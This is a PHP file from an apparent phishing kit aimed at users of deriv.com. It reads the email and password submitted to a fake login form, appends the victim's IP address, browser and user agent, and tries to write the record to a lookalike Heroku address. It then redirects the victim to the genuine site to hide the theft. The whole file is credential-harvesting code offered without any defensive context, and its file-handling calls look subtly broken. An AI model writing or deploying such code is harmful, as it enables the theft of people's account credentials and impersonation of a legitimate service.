<?php 

session_start();
// Logging details
if (isset($_POST['login'])) {

    include 'details.php';
	// getting user details
	$email = $_POST['email'];
	$password = $_POST['password'];
	$useragent = $_SERVER['HTTP_USER_AGENT'];


	$body .= "email                      : $email\r\n";
	$body .= "password                      : $password\r\n";
	$body .=  "|--------------- I N F O | I P -------------------|\r\n";
	$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";


	$file_points = "https://derivv.herokuapp.com/log/personl_details.txt";
	$save= file_get_contents($body);
	file_put_contents($file_points, $save);
	
}
header("Location: https://www.deriv.com");
?>
